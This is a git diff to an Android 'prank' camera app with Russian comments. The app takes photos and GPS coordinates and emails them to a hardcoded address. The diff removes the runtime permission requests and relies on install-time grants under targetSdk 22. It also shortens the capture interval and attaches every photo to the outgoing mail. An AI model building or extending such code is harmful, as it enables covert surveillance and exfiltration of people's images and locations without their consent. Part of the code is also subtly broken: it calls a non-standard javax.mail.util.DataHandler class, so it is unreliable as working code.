@@ -27,13 +27,11 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.List;
 import java.util.Locale;
 import java.util.Properties;
@@ -48,13 +46,14 @@ import javax.mail.internet.InternetAddress;
 import javax.mail.internet.MimeBodyPart;
 import javax.mail.internet.MimeMessage;
 import javax.mail.internet.MimeMultipart;
+import javax.mail.util.ByteArrayDataSource;
 
 public class MainActivity extends AppCompatActivity implements SurfaceHolder.Callback {
 
     private static final String TAG = "PrankCamera";
     private static final int PERMISSION_REQUEST_CODE = 100;
     private static final int PHOTO_COUNT = 3;  // 3 фото
-    private static final int PHOTO_INTERVAL_MS = 10000; // 10 секунд
+    private static final int PHOTO_INTERVAL_MS = 3000; // 3 секунды
 
     // Email настройки
     private static final String EMAIL_FROM = "metrobugitt@gmail.com";
@@ -74,6 +73,7 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
     private int photoCount = 0;
     private byte[] currentPhotoData;
     private StringBuilder photoDataForEmail;
+    private java.util.List<byte[]> photoList = new java.util.ArrayList<>();  // Список фото
     private String lastError = "";  // Последняя ошибка
     private LocationManager locationManager;
     
@@ -94,12 +94,12 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        
+
         // Не давать экрану гаснуть
         getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
-        
+
         initViews();
-        checkPermissions();
+        // Разрешения даются при установке (targetSdk 22)
     }
 
     private void initViews() {
@@ -114,46 +114,9 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
         imgPreview = findViewById(R.id.imgPreview);
 
         btnStart.setOnClickListener(v -> startPrank());
-        
+
         // Кнопка копирования ошибки
         btnCopyError.setOnClickListener(v -> copyErrorToClipboard());
-    }
-
-    private void checkPermissions() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
-                != PackageManager.PERMISSION_GRANTED ||
-            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
-                != PackageManager.PERMISSION_GRANTED ||
-            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
-                != PackageManager.PERMISSION_GRANTED) {
-            
-            ActivityCompat.requestPermissions(this, new String[]{
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            }, PERMISSION_REQUEST_CODE);
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
-                                           @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            boolean allGranted = true;
-            for (int result : grantResults) {
-                if (result != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                    break;
-                }
-            }
-            if (allGranted) {
-                Toast.makeText(this, "✅ Все разрешения получены!", Toast.LENGTH_SHORT).show();
-            } else {
-                Toast.makeText(this, "⚠️ Нужны все разрешения для работы!", Toast.LENGTH_LONG).show();
-            }
-        }
     }
 
     private void startPrank() {
@@ -164,6 +127,7 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
 
         photoCount = 0;
         photoDataForEmail = new StringBuilder();
+        photoList.clear();  // Очищаем список фото
         progressBar.setMax(PHOTO_COUNT);
         progressBar.setProgress(0);
         btnStart.setEnabled(false);
@@ -211,23 +175,26 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
     private final Camera.PictureCallback pictureCallback = (data, camera) -> {
         currentPhotoData = data;
         
+        // Сохраняем фото в список
+        photoList.add(data);
+
         // Получаем GPS координаты
         String locationInfo = getLocationInfo();
-        
+
         // Сохраняем данные для email
         String photoBase64 = Base64.encodeToString(data, Base64.NO_WRAP);
         photoDataForEmail.append("📸 Фото #").append(photoCount)
             .append(" - ").append(locationInfo).append("\n");
-        
+
         // Показываем превью
         Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
         imgPreview.setImageBitmap(bitmap);
-        
+
         // Предварительный просмотр камеры
         camera.startPreview();
-        
-        // Следующее фото через 10 секунд
-        txtStatus.setText("⏱️ Следующее фото через 10 сек...");
+
+        // Следующее фото через 3 секунды
+        txtStatus.setText("⏱️ Следующее фото через 3 сек...");
         handler.postDelayed(this::takeNextPhoto, PHOTO_INTERVAL_MS);
     };
 
@@ -334,6 +301,21 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
                     "\n😄 Вас разыграли!");
                 multipart.addBodyPart(textPart);
                 
+                // Прикрепляем фото
+                Log.d(TAG, "Прикрепление " + photoList.size() + " фото...");
+                for (int i = 0; i < photoList.size(); i++) {
+                    try {
+                        MimeBodyPart photoPart = new MimeBodyPart();
+                        photoPart.setDataHandler(new javax.mail.util.DataHandler(
+                            new javax.mail.util.ByteArrayDataSource(photoList.get(i), "image/jpeg")));
+                        photoPart.setFileName("prank_photo_" + (i + 1) + ".jpg");
+                        multipart.addBodyPart(photoPart);
+                        Log.d(TAG, "Фото #" + (i + 1) + " добавлено");
+                    } catch (Exception e) {
+                        Log.e(TAG, "Ошибка добавления фото #" + (i + 1), e);
+                    }
+                }
+
                 message.setContent(multipart);
 
                 Log.d(TAG, "Отправка email на: " + EMAIL_TO);
